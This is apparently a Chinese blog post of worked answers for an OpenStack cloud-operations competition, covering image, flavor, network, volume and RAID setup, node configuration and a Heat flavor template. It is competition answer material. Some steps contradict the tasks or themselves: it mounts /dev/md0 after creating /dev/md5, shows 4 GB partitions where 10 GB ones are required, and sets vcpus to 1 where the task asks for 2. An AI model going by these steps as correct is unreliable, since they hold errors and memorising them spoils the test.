<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"> openstack image create cirros --disk-format qcow2 --container bare --file /root/cirros-0.3.4-x86_64-disk.img</span><br><span class="line"> +------------------+------------------------------------------------------+</span><br><span class="line">| Field            | Value                                                |</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line">| checksum         | ee1eca47dc88f4879d8a229cc70a07c6                     |</span><br><span class="line">| container_format | bare                                                 |</span><br><span class="line">| created_at       | 2022-10-11T02:22:06Z                                 |</span><br><span class="line">| disk_format      | qcow2                                                |</span><br><span class="line">| file             | /v2/images/4650b6d8-97dc-44e2-89f0-3c674f22f422/file |</span><br><span class="line">| <span class="built_in">id</span>               | 4650b6d8-97dc-44e2-89f0-3c674f22f422                 |</span><br><span class="line">| min_disk         | 0                                                    |</span><br><span class="line">| min_ram          | 0                                                    |</span><br><span class="line">| name             | cirros                                               |</span><br><span class="line">| owner            | d58a1b0d053d4fd7ac1ddd98131973b3                     |</span><br><span class="line">| protected        | False                                                |</span><br><span class="line">| schema           | /v2/schemas/image                                    |</span><br><span class="line">| size             | 13287936                                             |</span><br><span class="line">| status           | active                                               |</span><br><span class="line">| tags             |                                                      |</span><br><span class="line">| updated_at       | 2022-10-11T02:22:06Z                                 |</span><br><span class="line">| virtual_size     | None                                                 |</span><br><span class="line">| visibility       | shared                                               |</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2．在openstack私有云平台上，使用命令创建一个名为Fmin，ID为1，内存为1024 MB，磁盘为10 GB，vcpu数量为1的云主机类型。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nova flavor-create Fmin 1 1024 10 1</span><br><span class="line">+----+------+-----------+------+-----------+------+-------+-------------+-----------+-------------+</span><br><span class="line">| ID | Name | Memory_MB | Disk | Ephemeral | Swap | VCPUs | RXTX_Factor | Is_Public | Description |</span><br><span class="line">+----+------+-----------+------+-----------+------+-------+-------------+-----------+-------------+</span><br><span class="line">| 1  | Fmin | 1024      | 10   | 0         |      | 1     | 1.0         | True      | -           |</span><br><span class="line">+----+------+-----------+------+-----------+------+-------+-------------+-----------+-------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>3．在openstack私有云平台上，使用命令创建云主机外部网络extnet，子网extsubnet，虚拟机浮动 IP 网段为192.168.x.0&#x2F;24（其中x是考位号）， 网关为192.168.x.1，网络使用vlan模式。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建网络</span></span><br><span class="line">openstack network create extnet --provider-network-type vlan --external --provider-physical-network provider </span><br><span class="line"><span class="comment">#绑定子网</span></span><br><span class="line"> openstack subnet create extsubnet --network extnet  --dhcp --gateway 192.168.200.1 --allocation-pool start=192.168.200.100,end=192.168.200.200 --subnet-range 192.168.200.0/24</span><br></pre></td></tr></table></figure>

<p>4．在openstack私有云平台上，通过使用命令创建云主机内网intnet，子网intsubnet，虚拟机子网 IP 网段为10.10.x.0&#x2F;24（其中x是考位号），网关为10.10.x.1。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建内网</span></span><br><span class="line">openstack network create intnet --internal</span><br><span class="line"><span class="comment">#绑定子网</span></span><br><span class="line">openstack subnet create intsubnet --network intnet  --dhcp --gateway 10.10.200.1 --allocation-pool start=10.10.200.100,end=10.10.200.200 --subnet-range 10.10.200.0/24</span><br></pre></td></tr></table></figure>

<p>5．添加名为 ext-router 的路由器，配置路由接口地址，完成内网子网intsubnet和外部网络extnet的连通。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建路由</span></span><br><span class="line">openstack router create ext-router  --<span class="built_in">enable</span></span><br><span class="line">openstack router <span class="built_in">set</span> --<span class="built_in">enable</span> --enable-snat --external-gateway extnet ext-router</span><br><span class="line"><span class="comment">#子网连通</span></span><br><span class="line">openstack router add subnet ext-router intsubnet</span><br></pre></td></tr></table></figure>

<p>6．在openstack私有云平台上，基于“cirros” 镜像、1vCPU&#x2F;1G &#x2F;10G 的flavor、 intsubnet的网络，绑定浮动IP，使用命令创建一台虚拟机VM1，启动VM1，并使用PC机能远程登录到VM1。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#若无法连接虚拟机vm1可能是外部网络的模式不正确。可以修改网络模式</span></span><br><span class="line"><span class="comment">#创建云主机</span></span><br><span class="line">nova boot --image cirros --flavor Fmin --nic net-name=intnet VM1 </span><br><span class="line"><span class="comment">#创建浮动ip</span></span><br><span class="line">openstack floating  ip create extnet</span><br><span class="line"><span class="comment">#查看浮动ip的id</span></span><br><span class="line">openstack floating ip list</span><br><span class="line"><span class="comment">#绑定</span></span><br><span class="line">openstack server add floating ip VM1 7bf5fa40-ec57-4abf-a666-b65082102a22</span><br></pre></td></tr></table></figure>

<p>7．在openstack私有云平台上，创建一个名为“lvm”的卷类型，创建1块卷类型为lvm的40G云盘，并附加到虚拟机VM1上。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建卷类型</span></span><br><span class="line">openstack volume <span class="built_in">type</span> create lvm</span><br><span class="line"><span class="comment">#创建lvm类型的卷</span></span><br><span class="line">openstack volume create --<span class="built_in">type</span> lvm --size 40 disk1</span><br><span class="line"><span class="comment">#绑定</span></span><br><span class="line">openstack server add volume VM1 disk1</span><br></pre></td></tr></table></figure>

<p>8．在虚拟机VM1上，使用附加的云盘，划分为4个10G的分区，创建一个raid 5，其中1个分区作为热备。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#分区 （注意分区内存都为10G）</span></span><br><span class="line">fdisk /dev/vdb</span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): p</span><br><span class="line"></span><br><span class="line">Disk /dev/vdb: 21.5 GB, 21474836480 bytes, 41943040 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk label <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x60fa7e70</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/vdb1            2048     8390655     4194304   83  Linux</span><br><span class="line">/dev/vdb2         8390656    16779263     4194304   83  Linux</span><br><span class="line">/dev/vdb3        16779264    25167871     4194304   83  Linux</span><br><span class="line">/dev/vdb4        25167872    33556479     4194304   83  Linux</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加yum源</span></span><br><span class="line"><span class="built_in">mv</span> /etc/yum.repos.d/* /etc/yum</span><br><span class="line"><span class="built_in">cat</span> /etc/yum.repos.d/ftp.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://192.168.100.10/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[openstack]</span><br><span class="line">name=openstack</span><br><span class="line">baseurl=ftp://192.168.100.10/openstack/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装mdadm</span></span><br><span class="line">yum install -y mdadm</span><br><span class="line">mdadm -C /dev/md5 -a <span class="built_in">yes</span> -l 5 -n 3 -x 1 /dev/vdb&#123;1,2,3,4&#125;</span><br><span class="line"><span class="comment">#参数解释</span></span><br><span class="line"><span class="comment"># -C  创建的意思</span></span><br><span class="line"><span class="comment">#/dev/md0  创建的raid名字，题目要求什么就给什么</span></span><br><span class="line"><span class="comment">#-C下的 -a yes|no 是否自动创建目标RAID设备的设备文件</span></span><br><span class="line"><span class="comment">#-l Raid的等级</span></span><br><span class="line"><span class="comment">#-n 使用多少块硬盘来创建当前Raid</span></span><br><span class="line"><span class="comment">#-x 空闲盘，这也就是热备盘了，当正常的盘出问题了，这块盘就能从 share状态 转换到 spare rebuilding状态，模拟情况见下方</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看详细信息</span></span><br><span class="line">mdadm -D /dev/md5   <span class="comment">#-D 显示raid的详细信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#挂载</span></span><br><span class="line"><span class="built_in">mkdir</span> /backup <span class="comment">#创建挂载点，挂载磁盘</span></span><br><span class="line">mkfs.ext4 /dev/md5 <span class="comment">#格式化磁盘，格式方式为ext4</span></span><br><span class="line">mount /dev/md0 /backup <span class="comment">#挂载磁盘到/backup目录</span></span><br><span class="line"><span class="built_in">df</span> -h <span class="comment">#查看磁盘挂载情况</span></span><br></pre></td></tr></table></figure>

<p>9．在Controller节点中编写&#x2F;root&#x2F;openstack&#x2F;deletevm.sh的shell脚本,释放虚拟机VM1，执行脚本完成实例释放。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> deletevm.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">source</span> /etc/keystone/admin-openrc.sh</span><br><span class="line">openstack server remove volume VM1 disk1 <span class="comment">#删除挂载的disk1</span></span><br><span class="line">openstack server  remove floating ip VM1 192.168.200.118 <span class="comment">#删除网络</span></span><br><span class="line">openstack server delete VM1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="第二套赛题"><a href="#第二套赛题" class="headerlink" title="第二套赛题"></a>第二套赛题</h1><h2 id="任务1-基础运维任务"><a href="#任务1-基础运维任务" class="headerlink" title="任务1 基础运维任务"></a>任务1 基础运维任务</h2><p>1．根据表1中的IP地址规划，设置各服务器节点的IP地址，确保网络正常通信，设置云服务器1主机名为Controller，云服务器2主机名为Compute，并修改hosts文件将IP地址映射为主机名，关闭防火墙并设置为开机不启动，设置SELinux为Permissive 模式。</p>
<p><strong>controller</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#更改主机名</span></span><br><span class="line">hostnamectl set-hostname controller</span><br><span class="line"><span class="comment">#添加映射</span></span><br><span class="line"><span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.100.10 controller</span><br><span class="line">192.168.100.20 compute</span><br><span class="line"><span class="comment">#关闭防火墙</span></span><br><span class="line">systemctl stop firewalld &amp;&amp; systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line"><span class="comment">#设置selinux</span></span><br><span class="line">setenforce 0</span><br><span class="line">vi /etc/selinux/config</span><br><span class="line">SELINUX=permissive <span class="comment">#修改为permissive</span></span><br></pre></td></tr></table></figure>

<p><strong>compute</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改主机名</span></span><br><span class="line">hostnamectl set-hostname compute</span><br><span class="line"><span class="comment">#添加映射</span></span><br><span class="line"><span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.100.10 controller</span><br><span class="line">192.168.100.20 compute</span><br><span class="line"><span class="comment">#关闭防火墙</span></span><br><span class="line">systemctl stop firewalld &amp;&amp; systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line"><span class="comment">#设置selinux</span></span><br><span class="line">setenforce 0</span><br><span class="line">vi /etc/selinux/config</span><br><span class="line">SELINUX=permissive <span class="comment">#修改为permissive</span></span><br></pre></td></tr></table></figure>

<p>2．将提供的CentOS-7-x86_64-DVD-1804.iso和OpenStackQueens.iso光盘镜像上传到Compute节点的&#x2F;root目录下，然后在&#x2F;opt目录下分别创建centos目录和openstack目录，并将镜像文件CentOS-7-x86_64-DVD-1804.iso挂载到centos目录下，将镜像文件OpenStackQueens.iso挂载到openstack目录下。</p>
<p>(若无该镜像用国赛镜像代替)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建目录</span><br><span class="line">mkdir /opt/centos</span><br><span class="line">mkdir /opt/openstack</span><br><span class="line">#挂载</span><br><span class="line">mount CentOS-7-x86_64-DVD-1804.iso /opt/centos/</span><br><span class="line">mount chinaskills_cloud_iaas.iso /opt/openstack/</span><br></pre></td></tr></table></figure>

<p>3．在Compute节点上利用centos目录中的软件包安装httpd服务器并设置开机自启动，提供yum仓库服务，并分别设置controller节点和compute节点的yum源文件http.repo，其中节点的地址使用IP形式。</p>
<p>controller</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> /etc/yum.repos.d/* /etc/yum</span><br><span class="line"><span class="comment">#编写yum源</span></span><br><span class="line"><span class="built_in">cat</span> /etc/yum.repos.d/local.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[openstack]</span><br><span class="line">name=openstack</span><br><span class="line">baseurl=file:///opt/openstack/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"><span class="comment">#更新缓存区</span></span><br><span class="line">yum repolist</span><br><span class="line"><span class="comment">#安装并配置vsftpd</span></span><br><span class="line">yum install -y vsftpd</span><br><span class="line">vi /etc/vsftpd/vsftpd.conf</span><br><span class="line">anon_root=/opt/</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动服务</span></span><br><span class="line">systemctl start vsftpd</span><br><span class="line">systemctl <span class="built_in">enable</span> vsftpd</span><br></pre></td></tr></table></figure>

<p><strong>compute</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mv /etc/yum.repos.d/* /etc/yum</span><br><span class="line">cat /etc/yum.repos.d/http.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://192.168.100.10/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[openstack]</span><br><span class="line">name=openstack</span><br><span class="line">baseurl=ftp://192.168.100.10/openstack/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">更新缓存区</span></span><br><span class="line">yum repolist</span><br></pre></td></tr></table></figure>

<p>4．在Controller节点上部署chrony服务器，允许其他节点同步时间，启动服务并设置为开机启动；并在compute节点上指定controller节点为上游NTP服务器，重启服务并设为开机启动。</p>
<p><strong>controller</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装chrony服务器</span></span><br><span class="line">yum install -y chrony</span><br><span class="line">vi /etc/chrony.conf</span><br><span class="line"><span class="comment">#server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server controller iburst</span><br><span class="line"><span class="comment">#添加在最后</span></span><br><span class="line">allow 192.168.100.0/24</span><br><span class="line"><span class="built_in">local</span> stratum 10</span><br><span class="line"><span class="comment">#重启并设为开机自动启动</span></span><br><span class="line">systemctl restart chronyd</span><br><span class="line">systemctl <span class="built_in">enable</span> chronyd</span><br><span class="line"><span class="comment">#生效</span></span><br><span class="line">chronyc <span class="built_in">source</span></span><br></pre></td></tr></table></figure>

<p><strong>compute</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/chrony.conf</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server controller iburst</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启并设为开机自动启动</span></span><br><span class="line">systemctl restart chronyd</span><br><span class="line">systemctl enable chronyd</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生效</span></span><br><span class="line">chronyc sources</span><br></pre></td></tr></table></figure>

<p>5．在compute节点上查看分区情况，并利用空白分区划分2个100G分区。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sdb</span><br></pre></td></tr></table></figure>



<h2 id="任务2-OpenStack搭建任务"><a href="#任务2-OpenStack搭建任务" class="headerlink" title="任务2  OpenStack搭建任务"></a>任务2  OpenStack搭建任务</h2><p>1．在控制节点和计算节点上分别安装quickinstall软件包，根据表2配置脚本文件中基本变量（配置脚本文件为&#x2F;etc&#x2F;cloudconfig&#x2F;openrc.sh）。</p>
<p>2．在controller点上使用 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-mysql.sh 脚本安装Mariadb、Memcached、etcd服务。</p>
<p>3．在controller节点上使用  &#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-keystone.sh 脚本安装Keystone 服务。</p>
<p>4．在controller节点上使用&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-glance.sh脚本安装 glance 服务。</p>
<p>5．在controller节点和compute节点上分别使用&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-nova -controller.sh脚本、&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-nova-compute.sh脚本安装Nova 服务。</p>
<p>6．在controller节点和compute节点上分别修改&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-neutron -controller.sh脚本、&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-neutron-compute.sh脚本分别安装 Neutron 服务，网络选用vlan模式。</p>
<p>7．在controller节点上使用 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-heat.sh 脚本dashboad服务。</p>
<p>8．在controller节点和compute节点上分别修改&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-swift -controller.sh脚本、&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-swift -controller.sh脚本安装 swift服务。</p>
<h2 id="任务3-OpenStack云平台运维（10分）-1"><a href="#任务3-OpenStack云平台运维（10分）-1" class="headerlink" title="任务3  OpenStack云平台运维（10分）"></a>任务3  OpenStack云平台运维（10分）</h2><p>1．在openstack私有云平台上，基于cirrors.qcow2镜像，使用命令创建一个名为cirros的镜像。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"> openstack image create cirros --disk-format qcow2 --container bare --file /root/cirros-0.3.4-x86_64-disk.img</span><br><span class="line"> +------------------+------------------------------------------------------+</span><br><span class="line">| Field            | Value                                                |</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line">| checksum         | ee1eca47dc88f4879d8a229cc70a07c6                     |</span><br><span class="line">| container_format | bare                                                 |</span><br><span class="line">| created_at       | 2022-10-11T02:22:06Z                                 |</span><br><span class="line">| disk_format      | qcow2                                                |</span><br><span class="line">| file             | /v2/images/4650b6d8-97dc-44e2-89f0-3c674f22f422/file |</span><br><span class="line">| <span class="built_in">id</span>               | 4650b6d8-97dc-44e2-89f0-3c674f22f422                 |</span><br><span class="line">| min_disk         | 0                                                    |</span><br><span class="line">| min_ram          | 0                                                    |</span><br><span class="line">| name             | cirros                                               |</span><br><span class="line">| owner            | d58a1b0d053d4fd7ac1ddd98131973b3                     |</span><br><span class="line">| protected        | False                                                |</span><br><span class="line">| schema           | /v2/schemas/image                                    |</span><br><span class="line">| size             | 13287936                                             |</span><br><span class="line">| status           | active                                               |</span><br><span class="line">| tags             |                                                      |</span><br><span class="line">| updated_at       | 2022-10-11T02:22:06Z                                 |</span><br><span class="line">| virtual_size     | None                                                 |</span><br><span class="line">| visibility       | shared                                               |</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2．在openstack私有云平台上，编写模板server.yml，创建名为“m1.flavor”、 ID 为 1234、 内存为 1024MB、硬盘为 20GB、 vcpu数量为 2的云主机类型。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在 controller节点安装 heat 服务</span></span><br><span class="line">[root@controller opt]# iaas-install-heat.sh </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看资源类型</span></span><br><span class="line">[root@controller opt]# heat resource-type-list</span><br><span class="line">WARNING (shell) <span class="string">&quot;heat resource-type-list&quot;</span> is deprecated, please use <span class="string">&quot;openstack orchestration resource type list&quot;</span> instead	<span class="comment"># 这里是警告 让使用 openstack orchestration resource type list 这个命令，不影响后续</span></span><br><span class="line">+------------------------------------------+</span><br><span class="line">| resource_type                            |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| AWS::AutoScaling::AutoScalingGroup       |</span><br><span class="line">|...					   |</span><br><span class="line">| OS::Cinder::EncryptedVolumeType          |</span><br><span class="line">| OS::Cinder::QoSAssociation               |</span><br><span class="line">| OS::Cinder::QoSSpecs                     |</span><br><span class="line">| OS::Cinder::Quota                        |</span><br><span class="line">| OS::Cinder::Volume                       |</span><br><span class="line">| OS::Cinder::VolumeAttachment             |</span><br><span class="line">| OS::Cinder::VolumeType                   |</span><br><span class="line">| OS::Glance::Image                        |</span><br><span class="line">| OS::Heat::AccessPolicy                   |</span><br><span class="line">| OS::Heat::AutoScalingGroup               |</span><br><span class="line">| OS::Heat::CloudConfig                    |</span><br><span class="line">| OS::Heat::DeployedServer                 |</span><br><span class="line">| OS::Heat::InstanceGroup                  |</span><br><span class="line">| OS::Heat::MultipartMime                  |</span><br><span class="line">| OS::Heat::None                           |</span><br><span class="line">| OS::Heat::RandomString                   |</span><br><span class="line">| OS::Heat::ResourceChain                  |</span><br><span class="line">| OS::Heat::ResourceGroup                  |</span><br><span class="line">| OS::Heat::ScalingPolicy                  |</span><br><span class="line">| OS::Heat::SoftwareComponent              |</span><br><span class="line">| OS::Heat::SoftwareConfig                 |</span><br><span class="line">| OS::Heat::SoftwareDeployment             |</span><br><span class="line">| OS::Heat::SoftwareDeploymentGroup        |</span><br><span class="line">| OS::Heat::Stack                          |</span><br><span class="line">| OS::Heat::StructuredConfig               |</span><br><span class="line">| OS::Heat::StructuredDeployment           |</span><br><span class="line">| OS::Heat::StructuredDeploymentGroup      |</span><br><span class="line">| OS::Heat::TestResource                   |</span><br><span class="line">| OS::Heat::UpdateWaitConditionHandle      |</span><br><span class="line">| OS::Heat::Value                          |</span><br><span class="line">| OS::Heat::WaitCondition                  |</span><br><span class="line">| OS::Heat::WaitConditionHandle            |</span><br><span class="line">| OS::Keystone::Domain                     |</span><br><span class="line">| OS::Keystone::Endpoint                   |</span><br><span class="line">| OS::Keystone::Group                      |</span><br><span class="line">| OS::Keystone::GroupRoleAssignment        |</span><br><span class="line">| OS::Keystone::Project                    |</span><br><span class="line">| OS::Keystone::Region                     |</span><br><span class="line">| OS::Keystone::Role                       |</span><br><span class="line">| OS::Keystone::Service                    |</span><br><span class="line">| OS::Keystone::User                       |</span><br><span class="line">| OS::Keystone::UserRoleAssignment         |</span><br><span class="line">| OS::Neutron::AddressScope                |</span><br><span class="line">| OS::Neutron::ExtraRoute                  |</span><br><span class="line">| OS::Neutron::FloatingIP                  |</span><br><span class="line">| OS::Neutron::FloatingIPAssociation       |</span><br><span class="line">| OS::Neutron::FlowClassifier              |</span><br><span class="line">| OS::Neutron::MeteringLabel               |</span><br><span class="line">| OS::Neutron::MeteringRule                |</span><br><span class="line">| OS::Neutron::Net                         |</span><br><span class="line">| OS::Neutron::NetworkGateway              |</span><br><span class="line">| OS::Neutron::Port                        |</span><br><span class="line">| OS::Neutron::PortPair                    |</span><br><span class="line">| OS::Neutron::ProviderNet                 |</span><br><span class="line">| OS::Neutron::Quota                       |</span><br><span class="line">| OS::Neutron::RBACPolicy                  |</span><br><span class="line">| OS::Neutron::Router                      |</span><br><span class="line">| OS::Neutron::RouterInterface             |</span><br><span class="line">| OS::Neutron::SecurityGroup               |</span><br><span class="line">| OS::Neutron::SecurityGroupRule           |</span><br><span class="line">| OS::Neutron::Subnet                      |</span><br><span class="line">| OS::Neutron::SubnetPool                  |</span><br><span class="line">| OS::Nova::Flavor                         |</span><br><span class="line">| OS::Nova::FloatingIP                     |</span><br><span class="line">| OS::Nova::FloatingIPAssociation          |</span><br><span class="line">| OS::Nova::HostAggregate                  |</span><br><span class="line">| OS::Nova::KeyPair                        |</span><br><span class="line">| OS::Nova::Quota                          |</span><br><span class="line">| OS::Nova::Server                         |</span><br><span class="line">| OS::Nova::ServerGroup                    |</span><br><span class="line">| OS::Senlin::Cluster                      |</span><br><span class="line">| OS::Senlin::Node                         |</span><br><span class="line">| OS::Senlin::Policy                       |</span><br><span class="line">| OS::Senlin::Profile                      |</span><br><span class="line">| OS::Senlin::Receiver                     |</span><br><span class="line">+------------------------------------------+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看可用于编排的模板版本</span></span><br><span class="line">[root@controller opt]# openstack orchestration template version list</span><br><span class="line">+--------------------------------------+------+------------------------------+</span><br><span class="line">| Version                              | Type | Aliases                      |</span><br><span class="line">+--------------------------------------+------+------------------------------+</span><br><span class="line">| AWSTemplateFormatVersion.2010-09-09  | cfn  |                              |</span><br><span class="line">| HeatTemplateFormatVersion.2012-12-12 | cfn  |                              |</span><br><span class="line">| heat_template_version.2013-05-23     | hot  |                              |</span><br><span class="line">| heat_template_version.2014-10-16     | hot  |                              |</span><br><span class="line">| heat_template_version.2015-04-30     | hot  |                              |</span><br><span class="line">| heat_template_version.2015-10-15     | hot  |                              |</span><br><span class="line">| heat_template_version.2016-04-08     | hot  |                              |</span><br><span class="line">| heat_template_version.2016-10-14     | hot  | heat_template_version.newton |</span><br><span class="line">| heat_template_version.2017-02-24     | hot  | heat_template_version.ocata  |</span><br><span class="line">| heat_template_version.2017-09-01     | hot  | heat_template_version.pike   |</span><br><span class="line">| heat_template_version.2018-03-02     | hot  | heat_template_version.queens |</span><br><span class="line">+--------------------------------------+------+------------------------------+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在/root/下编写 server.yaml 文件</span></span><br><span class="line">[root@controller ~]# vim server.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment"># server.yaml 文件内容</span></span><br><span class="line">[root@controller ~]# <span class="built_in">cat</span> server.yaml </span><br><span class="line">heat_template_version: 2015-04-30	<span class="comment"># 使用的heat模板版本</span></span><br><span class="line">description: Create Flavor		<span class="comment"># 描述信息</span></span><br><span class="line">resources: 		<span class="comment"># 定义资源</span></span><br><span class="line">        flavor:		<span class="comment"># 在模板的资源部分中必须是唯一的资源ID</span></span><br><span class="line">         <span class="built_in">type</span>: OS::Nova::Flavor	<span class="comment"># 资源类型，这里表示一个 Flavor 类型</span></span><br><span class="line">         properties:		<span class="comment"># 资源特定属性的列表。</span></span><br><span class="line">                name: <span class="string">&quot;m1.flavor&quot;</span>	<span class="comment"># Flavor类型的名称属性</span></span><br><span class="line">                flavorid: <span class="string">&quot;1234&quot;</span>	<span class="comment"># id属性，如果没有指定则会自动生成UUID</span></span><br><span class="line">                disk: 20		<span class="comment"># 磁盘大小默认是GB</span></span><br><span class="line">                ram: 1024		<span class="comment"># 内存大小必须是MB</span></span><br><span class="line">                vcpus: 1</span><br><span class="line">outputs:	<span class="comment"># 定义输出信息</span></span><br><span class="line">  flavor_info:	<span class="comment"># 输出信息的名称</span></span><br><span class="line">    description: Get the information of virtual machine <span class="built_in">type</span>	<span class="comment"># 输出描述</span></span><br><span class="line">    value: &#123; get_attr: [ flavor, show ] &#125;	<span class="comment"># get_attr 从相应资源定义创建的实例在运行时解析其属性值进行输出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建资源栈</span></span><br><span class="line">[root@controller ~]# heat stack-create m1_flavor_stack -f server.yaml</span><br><span class="line">WARNING (shell) <span class="string">&quot;heat stack-create&quot;</span> is deprecated, please use <span class="string">&quot;openstack stack create&quot;</span> instead</span><br><span class="line">WARNING (shell) <span class="string">&quot;heat stack-list&quot;</span> is deprecated, please use <span class="string">&quot;openstack stack list&quot;</span> instead</span><br><span class="line">+--------------------------------------+-----------------+--------------------+----------------------+--------------+----------------------------------+</span><br><span class="line">| <span class="built_in">id</span>                                   | stack_name      | stack_status       | creation_time        | updated_time | project                          |</span><br><span class="line">+--------------------------------------+-----------------+--------------------+----------------------+--------------+----------------------------------+</span><br><span class="line">| cb5d6ca6-9106-46f3-aa7d-8f85f0a86461 | m1_flavor_stack | CREATE_IN_PROGRESS | 2022-04-10T09:50:46Z | None         | d27d72c12d3b46b89572df53a71e5d04 |</span><br><span class="line">+--------------------------------------+-----------------+--------------------+----------------------+--------------+----------------------------------+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看资源栈列表</span></span><br><span class="line">[root@controller ~]# openstack stack list</span><br><span class="line">+--------------------------------------+-----------------+----------------------------------+-----------------+----------------------+--------------+</span><br><span class="line">| ID                                   | Stack Name      | Project                          | Stack Status    | Creation Time        | Updated Time |</span><br><span class="line">+--------------------------------------+-----------------+----------------------------------+-----------------+----------------------+--------------+</span><br><span class="line">| 5a4b1816-aaf6-4739-83e5-4001c80d89d1 | m1_flavor_stack | d27d72c12d3b46b89572df53a71e5d04 | CREATE_COMPLETE | 2022-04-10T10:31:32Z | None         |</span><br><span class="line">+--------------------------------------+-----------------+----------------------------------+-----------------+----------------------+--------------+</span><br><span class="line"><span class="comment">## Stack Status 显示  CREATE_COMPLETE 表示创建成功</span></span><br><span class="line"></span><br><span 